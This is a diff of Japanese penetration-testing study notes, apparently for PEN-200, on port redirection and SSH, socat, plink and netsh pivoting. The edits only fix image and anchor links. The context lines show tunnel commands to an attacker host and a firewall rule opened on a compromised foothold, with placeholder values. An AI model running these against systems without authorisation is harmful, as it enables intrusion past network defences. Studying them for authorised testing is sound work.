@@ -26,12 +26,12 @@ Port Redirection ＝ Port Forwarding
 
 リモートポートフォワーディング：
 	リッスンポートで受信したパケットをリモート端末のポートに転送すること
-![[Pasted image 20250920144229.png]]
+![](../../../画像ファイル/Pasted%20image%2020250920144229.png)
 $$リモートポートフォワーディングの概要イメージ(PEN-200)$$
 
 ローカルポートフォワーディング：
 	リッスンポートで受信したパケットをローカル端末のポートに転送すること
-![[Pasted image 20230526105054.png]]
+![](../../../画像ファイル/Pasted%20image%2020230526105054.png)
 $$ローカルポートフォワーディングの概要イメージ(TryHackMe)$$
 
 ---
@@ -50,9 +50,9 @@ socat -ddd TCP-LISTEN:[リッスンポート],fork TCP:[DestIP]:[Port]
 - `-ddd`：詳細出力
 - `fork`：指定することで、１回きりの通信で接続断しないようになる
 - 💡踏み台のリッスンポートは1,024超えのwell-knownポート以外を指定する
-![[Pasted image 20250920195209.png]]
+![](../../../画像ファイル/Pasted%20image%2020250920195209.png)
 $$Socatポートフォワーディング成功時出力$$
-![[Pasted image 20250920194904.png]]
+![](../../../画像ファイル/Pasted%20image%2020250920194904.png)
 $$socatでのポートフォワーディングイメージ図(PEN-200)$$
 
 2. 攻撃者のマシン(KALI-MACHINE)からリッスンポートにアクセスすることで、フォワーディング先のDestIPにアクセス可能
@@ -71,7 +71,7 @@ $$socatでのポートフォワーディングイメージ図(PEN-200)$$
 	- インタラクティブなシェルが使える
 		- WinRM接続中など、インタラクティブなシェルが使えない場合は、
 			- (a) Unix系：`python3 -c 'import pty; pty.spawn("/bin/sh")'`
-			- (b) Windows：[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md#Plink)や[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md#Netsh)を使う
+			- (b) Windows：[Port Redirection & SSH Port Forwarding](#Plink)や[Port Redirection & SSH Port Forwarding](#Netsh)を使う
 
 - ✅通常のネットワークトラフィックと見分けがつきにくい
 - ❌近年のFWに実装されているDeep Packet Inspection(DPI)機能により、悪意ある通信は検知され遮断されてしまう
@@ -79,18 +79,18 @@ $$socatでのポートフォワーディングイメージ図(PEN-200)$$
 
 ## SSHポートフォワーディングの種類と概要
 
-単純な[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md#ポートフォワーディング)では、パケットをリッスンするホスト自身(CONFLUENCE01)がパケットを転送するが、SSHポートフォワーディングでは、リッスンする役割を担う機器と転送する役割を担う機器の２つの機器でポートフォワーディングをする
+単純な[Port Redirection & SSH Port Forwarding](#ポートフォワーディング)では、パケットをリッスンするホスト自身(CONFLUENCE01)がパケットを転送するが、SSHポートフォワーディングでは、リッスンする役割を担う機器と転送する役割を担う機器の２つの機器でポートフォワーディングをする
 
 ### SSHローカルポートフォワーディング
 
 - 概要：ローカルマシン(SSHクライアント)のポートを、SSH サーバー経由で別のサーバーのポートに転送する
-![[Pasted image 20250920135759.png]]
+![](../../../画像ファイル/Pasted%20image%2020250920135759.png)
 $$SSHローカルポートフォワーディングのイメージ図(PEN-200)$$
 
 ### SSHローカルダイナミックポートフォワーディング
 
 - 概要：ローカルマシン(SSHクライアント)のポートを、SSH サーバー経由で別のサーバーの任意ポートに転送する
-![[Pasted image 20250923152247.png]]
+![](../../../画像ファイル/Pasted%20image%2020250923152247.png)
 $$SSHローカルダイナミックポートフォワーディングのイメージ図(PEN-200)$$
 
 ### SSHリモートポートフォワーディング
@@ -101,15 +101,15 @@ $$SSHローカルダイナミックポートフォワーディングのイメー
 	2. 攻撃者のマシンのポートに送信されたパケットが、ステップ１で確立したSSH接続を介してSSHクライアントに送付され、そこから目的のマシンに到達
 
 - 用途として、踏み台を介して社内NWにアクセスすることや、FWをバイパスして特定のポートにアクセスすることがある
-![[Pasted image 20250920135820.png]]
+![](../../../画像ファイル/Pasted%20image%2020250920135820.png)
 $$SSHリモートポートフォワーディングのイメージ図(PEN-200)$$
-![[Pasted image 20250924122130.png]]
+![](../../../画像ファイル/Pasted%20image%2020250924122130.png)
 $$SSHリモートポートフォワーディングのイメージ図(PEN-200)$$
 
 ### SSHリモートダイナミックポートフォワーディング
 
 - 概要：SSHサーバー側のポートを、ローカルマシン(SSHクライアント)経由で別のサーバーの任意ポートに転送する
-![[Pasted image 20250923120928.png]]
+![](../../../画像ファイル/Pasted%20image%2020250923120928.png)
 $$SSHリモートダイナミックポートフォワーディングのイメージ図(PEN-200)$$
 
 ---
@@ -120,7 +120,7 @@ $$SSHリモートダイナミックポートフォワーディングのイメー
 - 留意事項：
 	- FWのルールは、アウトバウンドトラフィックには比較的寛容に設定されているが、インバウンドトラフィックには厳しいことが多い
 	- Local Port Forwardingはインバウンドトラフィックが許可されていないと使えないので失敗することが多い(SSHクライアントで任意のリッスンポートを開いても、攻撃者のマシンからのリッスンポートへの通信がFWで遮断される)
-	- →[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md#SSH%20Remote%20Port%20Forwarding)のほうが成功確率高い
+	- →[Port Redirection & SSH Port Forwarding](#SSH%20Remote%20Port%20Forwarding)のほうが成功確率高い
 
 1. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
 ```zsh
@@ -138,7 +138,7 @@ ssh -N -L 0.0.0.0:[SSH client LISTEN Port(1025以上任意)]:[DestIP]:[DestPort]
 	- [🔍Windows Local Enumeration](../../🪟Windows/🔍Windows%20Local%20Enumeration.md#ネットワーク情報収集コマンド)
 	- [🔍Linux Enumeration](../../🐧Linux/🔍Linux%20Enumeration.md#ネットワーク情報収集コマンド)
 - `-N`：ポートフォワーディングのために使用することを明示し、新たなシェルが開かないようにする
-![[Pasted image 20250923145526.png]]
+![](../../../画像ファイル/Pasted%20image%2020250923145526.png)
 $$SSHローカルポートフォワーディングイメージ図$$
 
 3. 別のセッションでSSHクライアントにアクセスし、SSHローカルポートフォワーディングに成功しているかどうかを確認
@@ -159,8 +159,8 @@ tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*     
 
 # SSH Local Dynamic Port Forwarding
 
-- [Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md#SSH%20Local%20Port%20Forwarding)と同じく、現実では失敗する可能性が高い
-	- →[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md#SSH%20Remote%20Dynamic%20Port%20Forwarding)
+- [Port Redirection & SSH Port Forwarding](#SSH%20Local%20Port%20Forwarding)と同じく、現実では失敗する可能性が高い
+	- →[Port Redirection & SSH Port Forwarding](#SSH%20Remote%20Dynamic%20Port%20Forwarding)
 
 1. SSHクライアント上でSSH接続に必要なTTY機能が使えるようにする
 	- RDP接続など、インタラクティブなシェルにアクセスできているなら不要
@@ -247,7 +247,7 @@ Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
 tcp   LISTEN 0      128        127.0.0.1:[listenport]      0.0.0.0:*
 ```
 
-![[Pasted image 20250923181415.png]]
+![](../../../画像ファイル/Pasted%20image%2020250923181415.png)
 $$SSHリモートポートフォワーディングイメージ図(PEN-200)$$
 
 5. 攻撃者のマシンから攻撃者マシンのリッスンポートに接続することで、目的マシンのDestPortにアクセス可能
@@ -295,7 +295,7 @@ tcp   LISTEN  0       128            0.0.0.0:22          0.0.0.0:*     users:(("
 tcp   LISTEN  0       128              [::1]:9998           [::]:*     users:(("sshd",pid=939038,fd=7))
 ```
 
-![[Pasted image 20250923184203.png]]
+![](../../../画像ファイル/Pasted%20image%2020250923184203.png)
 $$リモートダイナミックポートフォワーディングによって内部NWを列挙する図(PEN-200)$$
 
 5. 攻撃者のマシン上で、Proxychainsの設定を変更する
@@ -390,9 +390,9 @@ CommandType     Name    Version    Source
 Application     ssh.exe 8.1.0.1    C:\Windows\System32\OpenSSH\ssh.exe
 ```
 
-3. あとは[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md#SSH%20Remote%20Dynamic%20Port%20Forwarding)のステップ３以降と同じ(`ssh -N...`)
+3. あとは[Port Redirection & SSH Port Forwarding](#SSH%20Remote%20Dynamic%20Port%20Forwarding)のステップ３以降と同じ(`ssh -N...`)
 
-![[Pasted image 20250924072013.png]]
+![](../../../画像ファイル/Pasted%20image%2020250924072013.png)
 $$ssh.exeを使ったリモートダイナミックポートフォワーディングのイメージ図(PEN-200)$$
 
 ---
@@ -425,7 +425,7 @@ sudo systemctl start ssh
 # windowsシェルが非ttyシェルの場合は先頭に`cmd.exe /c echo y |`を追加
 C:\Windows\Temp\plink.exe -ssh -l [攻撃者のusername] -pw [pw] -R 127.0.0.1:[SSH server LISTEN Port(1025以上任意)]:127.0.0.1:[Plinkクライアントリッスンポート] [AttackerIP]
 ```
-![[Pasted image 20250924122130.png]]
+![](../../../画像ファイル/Pasted%20image%2020250924122130.png)
 $$PlinkポートフォワーディングでFWをバイパスしているイメージ図(PEN-200)$$
 
 4. 任意の操作を実施
@@ -451,7 +451,7 @@ mysql -h 127.0.0.1 -P <SSH server LISTEN Port(1025以上任意)> -u <username> -
 netsh interface portproxy add v4tov4 listenport=[Netshクライアントリッスンポート(1025以上任意)] listenaddress=[NetshクライアントIP] connectport=[Dest Port] connectaddress=[Dest IP]
 ```
 - `v4tov4`：IPv4からIPv4へのポートフォワーディングを意味する
-![[Pasted image 20250925065912.png]]
+![](../../../画像ファイル/Pasted%20image%2020250925065912.png)
 $$netshによるポートフォワーディングのイメージ(PEN-200)$$
 
 2. 攻撃者のマシンから足場のマシンへの通信がFWで遮断される場合は、netshでFWを操作し、リッスンポートへの通信を許可する
@@ -459,7 +459,7 @@ $$netshによるポートフォワーディングのイメージ(PEN-200)$$
 ```cmd
 netsh advfirewall firewall add rule name="[rule name]" protocol=TCP dir=in localip=[NetshクライアントIP] localport=[指定したリッスンポート] action=allow
 ```
-![[Pasted image 20250925071526.png]]
+![](../../../画像ファイル/Pasted%20image%2020250925071526.png)
 $$netshでFWの穴あけ後$$
 3. 攻撃者のマシンからNmap等でリッスンポート経由でDestのソケットにアクセス
 ```zsh
